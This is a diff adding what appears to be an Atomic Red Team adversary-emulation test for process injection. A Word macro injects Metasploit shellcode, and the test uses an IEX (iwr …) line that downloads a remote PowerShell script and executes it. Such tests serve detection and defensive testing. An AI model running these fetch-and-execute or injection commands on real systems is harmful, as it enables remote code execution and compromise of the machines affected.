@@ -1,0 +1,13 @@
+#TechniqueName: Process Injection
+#AtomicTestName: Shellcode execution via VBA
+#Description: This module injects shellcode into a newly created process and executes. By default the shellcode is created,&with Metasploit, for use on x86-64 Windows 10 machines.&&Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office&is required.&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
+
